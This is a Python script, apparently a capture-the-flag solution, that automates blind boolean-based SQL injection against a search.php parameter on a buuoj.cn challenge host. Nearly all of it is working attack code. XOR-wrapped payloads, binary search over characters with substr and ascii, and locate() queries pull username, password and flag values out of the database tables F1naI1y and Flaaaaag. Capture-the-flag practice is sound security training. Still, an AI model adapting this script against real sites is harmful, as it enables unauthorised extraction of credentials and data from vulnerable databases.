#!/usr/bin/env python3
import requests

url = "http://38bd0888-cf6a-43b6-b6bd-fa991cb62b1d.node5.buuoj.cn:81/search.php"

def check(payload):
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text
    except:
        return False

def get_length(payload_prefix, max_len=500):
    for i in range(1, max_len + 1):
        payload = f"1^(length(({payload_prefix}))={i})"
        if check(payload):
            return i
    return 0

def get_char(payload_prefix, pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"1^(ascii(substr(({payload_prefix}),{pos},1))>{mid})"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if 32 <= low <= 126 else "?"

def get_string(payload_prefix, length):
    result = ""
    for i in range(1, length + 1):
        c = get_char(payload_prefix, i)
        result += c
        print(f"[+] Position {i}: {c} -> {result}")
    return result

# 搜索包含 'flag' 的数据（不区分大小写）
print("[*] Searching for data containing 'flag'...")

# 检查 F1naI1y 表的 username
for i in range(1, 100):
    # 检查 username 是否包含 'flag'
    check_query = f"locate('flag',(select(username)from(F1naI1y)where(id={i})))"
    # 如果 locate > 0，则包含 'flag'
    if check(f"1^({check_query}>0)"):
        print(f"[+] Found 'flag' in F1naI1y username id={i}")
        username_query = f"select(username)from(F1naI1y)where(id={i})"
        length = get_length(username_query)
        if length > 0:
            username = get_string(username_query, length)
            print(f"[+] Username: {username}")
        break

# 检查 F1naI1y 表的 password
for i in range(1, 100):
    check_query = f"locate('flag',(select(password)from(F1naI1y)where(id={i})))"
    if check(f"1^({check_query}>0)"):
        print(f"[+] Found 'flag' in F1naI1y password id={i}")
        password_query = f"select(password)from(F1naI1y)where(id={i})"
        length = get_length(password_query)
        if length > 0:
            password = get_string(password_query, length)
            print(f"[+] Password: {password}")
        break

# 检查 Flaaaaag 表
for i in range(1, 10):
    check_query = f"locate('flag',(select(fl4gawsl)from(Flaaaaag)where(id={i})))"
    if check(f"1^({check_query}>0)"):
        print(f"[+] Found 'flag' in Flaaaaag id={i}")
        flag_query = f"select(fl4gawsl)from(Flaaaaag)where(id={i})"
        length = get_length(flag_query)
        if length > 0:
            flag = get_string(flag_query, length)
            print(f"[+] Flag: {flag}")
        break

print("\n[*] Done searching")
